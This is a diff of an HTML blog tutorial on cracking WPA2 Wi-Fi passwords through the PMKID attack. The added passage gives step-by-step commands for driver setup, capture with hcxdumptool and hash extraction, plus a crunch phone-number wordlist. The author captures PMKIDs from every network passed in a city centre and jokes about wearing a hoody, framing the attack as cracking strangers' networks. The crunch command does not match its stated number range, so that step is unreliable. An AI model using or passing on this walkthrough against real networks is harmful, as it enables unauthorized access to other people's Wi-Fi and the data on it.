@@ -139,16 +139,57 @@
 <p>All of this changed in 2018 when <a href="https://hashcat.net/forum/thread-7717.html">atom's</a> accidentally discovered a new way to crack WPA2 while searching for new ways to crack the new WPA3 security standard (GO READ HIS RESEARCH !).</p>
 <p>Atom's technique is clientless, making the need to capture a user's login in real time and the need for users to connect to the network at all <strong>obsolete</strong>. Furthermore, it only required the attacker to capture a single frame and <strong>eliminate the wrong passwords and malformed frames that are disturbing the cracking process</strong>.</p>
 <p>This means we do not need to wait for people connecting to their routers for this attack to be successful. We just need a PMKID hash and try to crack it.</p>
-<p>To crack a PMKID hash generated and what elements does it contain 
-<img src="https://i.imgur.com/NlZfEOP.png" alt="PMKID Hash" />
-The hash calculation might seem daunting at first glance but let us dive into it.
-<img src="https://i.imgur.com/xx4Xlme.png" alt="" />
-The PMK is computed as follows:
-<img src="https://i.imgur.com/zTGtXyD.png" alt="" />
+<p>To crack a PMKID hash generated and what elements does it contain </p>
+<p><img src="https://i.imgur.com/NlZfEOP.png" alt="PMKID Hash" />
+The hash calculation might seem daunting at first glance but let us dive into it.</p>
+<p><img src="https://i.imgur.com/xx4Xlme.png" alt="" />
+<strong>The PMK is computed as follows:</strong></p>
+<p><img src="https://i.imgur.com/zTGtXyD.png" alt="" />
 After a PMK was generated we can generate a PMKID.</p>
-<p><strong>The PMKID is computed as follows :</strong>
-<img src="https://i.imgur.com/6oEJGPz.png" alt="" />
+<p><strong>The PMKID is computed as follows :</strong></p>
+<p><img src="https://i.imgur.com/6oEJGPz.png" alt="" />
 <img src="https://i.imgur.com/ODQeVSz.png" alt="" /></p>
+<h2 id="sniffing-pmkid"><a class="header" href="#sniffing-pmkid">Sniffing PMKID</a></h2>
+<p>To gather PMKID hashes, we need a wireless network interface that has monitor mode capabilities. Monitor mode allows packet capturing without having to associate with an access point.</p>
+<p>For this i'll use the <a href="https://www.alfa.com.tw/products/awus036ach?variant=36473965871176">AWUS036ACH from ALFA Network</a> which supports monitor mode and went inside the center of my city.</p>
+<p>My machine is running arch linux (kernel 5.16.4-arch1-1), the instructions are pretty similar for debian based distributions.</p>
+<h4 id="installing-drivers"><a class="header" href="#installing-drivers">Installing Drivers</a></h4>
+<pre><code>git clone -b v5.6.4.2 https://github.com/aircrack-ng/rtl8812au
+cd rtl8812au
+make &amp;&amp; sudo make install
+</code></pre>
+<h4 id="installing-hcxdumptool"><a class="header" href="#installing-hcxdumptool">Installing Hcxdumptool</a></h4>
+<pre><code>sudo pacman -S hcxdumptool
+</code></pre>
+<h4 id="preparing-network"><a class="header" href="#preparing-network">Preparing Network</a></h4>
+<p>For the sniffing to work properly we will need to stop services that might interfere with hcxdumptool.</p>
+<pre><code>sudo systemctl stop wpa_supplicant
+sudo systemctl stop NetworkManager
+sudo airmon-ng check-kill
+</code></pre>
+<p><em>Note that it is not required to start monitor mode prior to hcxdumptool execution, since hcxdumptool will automatically make the use of syscalls and turn the interface in monitor mode by itself.</em></p>
+<h4 id="starting-the-sniffing-with-hcxdumptool"><a class="header" href="#starting-the-sniffing-with-hcxdumptool">Starting the sniffing with hcxdumptool</a></h4>
+<pre><code>sudo hcxdumptool -i wlan1 -o PMKID_CAP1.pcapng --disable_deauthentication --disable_client_attacks --enable_status=3
+</code></pre>
+<p><em>Now wear a hoody, because you will get a PMKID of every network you cross by that is vulnerable to the attack</em>.
+<img src="https://i.imgur.com/hM1pzNY.png" alt="" /></p>
+<h2 id="cracking-time"><a class="header" href="#cracking-time">Cracking Time</a></h2>
+<p>Now time for the last part of this sniffing attack, we will extract the hashes from our pcapng capture with the hcxpcapngtool.</p>
+<pre><code>hcxpcapngtool -o Hashes.txt PMKID_CAP1.pcapng
+</code></pre>
+<p>This command will produce a hash file that each line takes on the following structure :</p>
+<pre><code>SIGNATURE*TYPE*PMKID/MIC*MACAP*MACSTA*ESSID***
+</code></pre>
+<h4 id="install-hashcat"><a class="header" href="#install-hashcat">Install Hashcat</a></h4>
+<p>Installing hashcat on arch can be easily done with the following command</p>
+<pre><code>sudo pacman -S hashcat
+</code></pre>
+<h4 id="start-cracking-procedure"><a class="header" href="#start-cracking-procedure">Start Cracking Procedure</a></h4>
+<p>You can generate a wordlists of all the phone network for a region identifier using crunch. If my region identifier is 450 then i would use the following command</p>
+<pre><code>crunch 12 12 0123456789 -t 450@@@@@@@@@ -o phones.txt
+</code></pre>
+<p>The preceding command will generate a wordlist (phones.txt) with phone numbers starting from 4500000000 all the way up to 4509999999.</p>
+<p>A lot of people are using their phone numbers as password, you can easily crack these networks with this simple trick :)</p>
 
                     </main>
 
